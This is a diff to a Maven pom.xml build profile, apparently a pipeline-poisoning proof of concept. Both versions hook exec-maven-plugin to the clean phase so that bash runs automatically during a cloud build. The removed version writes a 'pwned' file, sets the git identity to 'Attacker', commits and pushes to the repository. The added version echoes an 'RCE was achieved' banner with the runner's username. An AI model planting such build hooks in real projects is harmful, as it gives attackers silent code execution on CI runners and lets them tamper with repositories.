@@ -11,38 +11,32 @@
                     <name>cloudBuild</name>
                 </property>
             </activation>
-            <build>
-                <plugins>
-                    <plugin>
-                        <groupId>org.codehaus.mojo</groupId>
-                        <artifactId>exec-maven-plugin</artifactId>
-                        <version>3.1.1</version>
-                        <executions>
-                            <execution>
-                                <id>run-after-clean</id>
-                                <phase>clean</phase>
-                                <goals>
-                                    <goal>exec</goal>
-                                </goals>
-                                <configuration>
-                                    <executable>/bin/bash</executable>
-                                    <arguments>
-                                        <argument>-c</argument>
-                                        <argument>
-                                            echo "pwned by attacker" > pwned.txt;
-                                            git config --global user.name "Attacker";
-                                            git config --global user.email "attacker@example.com";
-                                            git add pwned.txt;
-                                            git commit -m "pwned hacked";
-                                            git push;
-                                        </argument>
-                                    </arguments>
-                                </configuration>
-                            </execution>
-                        </executions>
-                    </plugin>
-                </plugins>
-            </build>
+ <build>
+        <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.1.1</version>
+                <executions>
+                    <execution>
+                        <id>run-poc</id>
+                        <phase>clean</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <executable>/bin/bash</executable>
+
+                            <arguments>
+                                <argument>-c</argument>
+                                <argument>echo "✅ ✅ POC SUCCESSFUL! RCE was achieved. Runner user is $(whoami) ✅ ✅"</argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
         </profile>
     </profiles>
 </project>
